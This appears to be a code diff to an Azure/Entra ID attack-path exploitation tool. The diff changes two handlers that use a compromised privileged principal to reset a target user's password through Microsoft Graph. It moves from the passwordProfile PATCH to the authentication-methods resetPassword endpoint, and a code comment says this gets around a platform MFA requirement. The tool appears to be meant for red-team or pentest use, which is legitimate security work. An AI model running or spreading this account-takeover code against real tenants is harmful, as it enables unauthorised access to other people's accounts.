@@ -390,8 +390,9 @@ class AZResetPasswordHandler(AzureBaseHandler):
     """AZResetPassword: a password-reset-capable principal (Helpdesk / Password /
     Authentication / User Administrator) resets a target user's password.
 
-    Graph: ``PATCH /users/{id}`` with a new passwordProfile. Irreversible
-    (original password unknown) so no rollback.
+    Graph: ``POST /users/{id}/authentication/methods/{pwdMethodId}/resetPassword``
+    with ``{"newPassword": "..."}`` — requires ``UserAuthenticationMethod.ReadWrite.All``.
+    Returns 202 Accepted (async). Irreversible (original password unknown) — no rollback.
     """
 
     @staticmethod
@@ -425,9 +426,14 @@ class AZResetPasswordHandler(AzureBaseHandler):
         if not token:
             return False, f"Failed to obtain Graph token for {edge.source.name}", []
 
+        # PATCH /users/{id}/passwordProfile is blocked by Microsoft's platform-level
+        # MFA requirement regardless of tenant CA policy config. Use the admin-reset
+        # path via the authentication methods API instead — requires
+        # UserAuthenticationMethod.ReadWrite.All and returns 202 Accepted.
+        _PWD_METHOD = "28c10230-6103-485e-b985-444c60001490"
         res = await roadtx.graph_request(
-            "PATCH", f"/users/{tgt}", token,
-            body={"passwordProfile": {"forceChangePasswordNextSignIn": False, "password": new_pw}},
+            "POST", f"/users/{tgt}/authentication/methods/{_PWD_METHOD}/resetPassword",
+            token, body={"newPassword": new_pw},
         )
         if not res.get("success"):
             return False, f"Password reset failed: {res.get('error', 'unknown')}", []
@@ -1194,8 +1200,9 @@ class AZPrivilegedAuthAdminHandler(AzureBaseHandler):
 
     Can reset passwords and authentication methods for most non-GA users.
     Exploits by resetting a specific target user's password.
-    Target user via ``-p target_user_id=<objectId>`` and
-    ``-p target_upn=<UPN>`` (for the Graph PATCH call).
+    Target user via ``-p target_user_id=<objectId>`` and ``-p target_upn=<UPN>``.
+    Graph: ``POST /users/{id}/authentication/methods/{pwdMethodId}/resetPassword``
+    — requires ``UserAuthenticationMethod.ReadWrite.All``. Returns 202 Accepted.
     """
 
     @staticmethod
@@ -1236,9 +1243,10 @@ class AZPrivilegedAuthAdminHandler(AzureBaseHandler):
         if not token:
             return False, f"Failed to obtain Graph token for {edge.source.name}", []
 
+        _PWD_METHOD = "28c10230-6103-485e-b985-444c60001490"
         res = await roadtx.graph_request(
-            "PATCH", f"/users/{uid}", token,
-            body={"passwordProfile": {"forceChangePasswordNextSignIn": False, "password": new_pw}},
+            "POST", f"/users/{uid}/authentication/methods/{_PWD_METHOD}/resetPassword",
+            token, body={"newPassword": new_pw},
         )
         if not res.get("success"):
             return False, f"Password reset failed: {res.get('error', 'unknown')}", []
